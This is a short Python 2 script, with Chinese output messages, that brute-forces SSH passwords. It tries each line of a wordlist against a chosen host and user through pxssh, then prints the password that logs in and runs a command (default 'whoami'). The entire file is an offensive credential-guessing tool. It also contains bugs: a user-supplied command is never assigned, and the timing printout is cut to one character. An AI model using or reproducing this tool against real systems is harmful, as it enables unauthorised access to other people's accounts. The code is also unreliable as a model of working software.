# coding=utf-8
#!/usr/bin/env python2
from pexpect import pxssh
import optparse
import time
def connect(user,host,password,cmd):
    global flag
    flag = 0
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        s.sendline(cmd)
        c = s.prompt()
        s = s.before
        # print s
        flag +=1
        return flag
    except:
        print password + '[-] 密码错误'
        return flag
def main():
    global flag
    parse = optparse.OptionParser()
    parse.add_option('-u','--user',dest='username',help='login user')
    parse.add_option('-H','--host',dest='ip',help='ip add')
    parse.add_option('-p','--pass',dest='passwd',type='str',help='login pass')
    parse.add_option('-c','--cmd',dest='cmd',help='cmd')
    (options,args) = parse.parse_args()
    if (options.username == None) or (options.ip == None) or (options.passwd == None):
        print '参数错误'
        exit(0)
    password_dir = str(options.passwd)
    user = str(options.username)
    host = str(options.ip)
    if (options.cmd == None):
        cmd = 'whoami'
    password_file = open(password_dir,'r')
    for line in password_file:
        # password = password_file.readline()
        password = line.strip()
        start_time = time.time()
        connect(user,host,password,cmd)
        if flag == 1:
            print '[+] 密码：' + password
            break
        end_time = time.time()
        print '用时：{:.1s}'.format(str(end_time-start_time) + '秒')
    password_file.close()
if __name__ == '__main__':
    main()
